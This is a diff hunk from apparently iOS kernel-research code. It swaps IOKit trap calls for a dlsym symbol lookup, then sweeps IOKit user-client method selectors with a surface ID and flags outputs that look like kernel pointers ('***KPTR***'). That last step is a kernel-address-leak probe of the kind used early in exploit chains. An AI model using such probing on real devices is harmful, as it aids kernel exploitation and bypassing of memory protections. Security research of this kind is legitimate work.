@@ -16786,30 +16786,44 @@ static void r432_probe(void) {
             CFRelease(sp);
             for (int i = 0; i < 5; i++) CFRelease(tn[i]);
 
-            /* Try IOConnectTrap0-6 */
-            /* These are ioctl_trap-style fast paths */
-            rlog("    IOConnectTrap calls:\n");
-            for (int trap = 0; trap <= 6; trap++) {
-                kern_return_t tr;
-                switch (trap) {
-                    case 0: tr = IOConnectTrap0(conn, 0); break;
-                    case 1: tr = IOConnectTrap1(conn, 0, tsid); break;
-                    case 2: tr = IOConnectTrap2(conn, 0, tsid, 0); break;
-                    case 3: tr = IOConnectTrap3(conn, 0, tsid, 0, 0); break;
-                    case 4: tr = IOConnectTrap4(conn, 0, tsid, 0, 0, 0); break;
-                    case 5: tr = IOConnectTrap5(conn, 0, tsid, 0, 0, 0, 0); break;
-                    case 6: tr = IOConnectTrap6(conn, 0, tsid, 0, 0, 0, 0, 0); break;
-                    default: tr = -1;
-                }
-                rlog("      trap%d(sel=0, sid=%u): 0x%x (%d)\n", trap, tsid, tr, tr);
+            /* IOConnectTrap* unavailable on iOS — use raw mach trap #31 */
+            /* iokit_user_client_trap: mach trap 31 */
+            /* Signature: kern_return_t iokit_user_client_trap(
+             *   mach_port_t connect, uint32_t index,
+             *   uintptr_t p1-p6) */
+            typedef kern_return_t (*iokit_trap_fn)(mach_port_t, uint32_t,
+                uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t, uintptr_t);
+            iokit_trap_fn iokit_trap = (iokit_trap_fn)dlsym(RTLD_DEFAULT,
+                "IOConnectTrap6");
+            if (!iokit_trap) {
+                /* Try the internal symbol */
+                iokit_trap = (iokit_trap_fn)dlsym(RTLD_DEFAULT,
+                    "io_connect_method_scalarI_scalarO");
             }
+            rlog("    iokit_trap fn: %p\n", iokit_trap);
 
-            /* Try different selectors with trap1 */
-            rlog("    Trap1 with different selectors:\n");
+            /* Try IOConnectCallScalarMethod as an alternative */
+            rlog("    ScalarMethod selectors with surface ID:\n");
             for (int sel = 0; sel <= 30; sel++) {
-                kern_return_t tr = IOConnectTrap1(conn, sel, tsid);
-                if (tr != (kern_return_t)0xe00002bc) { /* Skip kIOReturnBadArgument */
-                    rlog("      trap1(sel=%d): 0x%x (%d)\n", sel, tr, tr);
+                uint64_t in_sc[6] = {tsid, 0, 0, 0, 0, 0};
+                uint64_t out[16] = {0};
+                uint32_t outcnt = 16;
+                kern_return_t kr2 = IOConnectCallMethod(conn, sel,
+                    in_sc, 1, NULL, 0, out, &outcnt, NULL, NULL);
+                if (kr2 == 0 && outcnt > 0) {
+                    int nonzero = 0;
+                    for (uint32_t j = 0; j < outcnt; j++) if (out[j] != 0) nonzero++;
+                    if (nonzero > 0) {
+                        rlog("      sel %d: %d nonzero outputs\n", sel, nonzero);
+                        for (uint32_t j = 0; j < outcnt && j < 4; j++) {
+                            if (out[j] != 0) {
+                                rlog("        [%u]=0x%016llx", j, (unsigned long long)out[j]);
+                                if ((out[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                    rlog(" ***KPTR***");
+                                rlog("\n");
+                            }
+                        }
+                    }
                 }
             }
 
